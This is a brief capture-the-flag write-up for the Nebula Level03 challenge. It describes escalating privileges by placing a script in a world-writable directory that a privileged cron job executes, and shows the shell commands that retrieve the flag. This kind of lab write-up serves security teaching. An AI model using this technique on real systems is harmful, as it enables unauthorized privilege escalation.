# Level03

Crontab runs the `writeable.sh` script every now and then, which runs the scripts inside of `writeable.d/` before removing them. The job is run with elevated privileges, so we can just make a script containing `getflag > out_file`, place it inside of `writeable.d/`, and wait for it to be executed.

```bash
level03@nebula:/home/flag03$ echo 'getflag > /home/flag03/flag.txt' > writable.d/exploit
level03@nebula:/home/flag03$ cat flag.txt 
You have successfully executed getflag on a target account
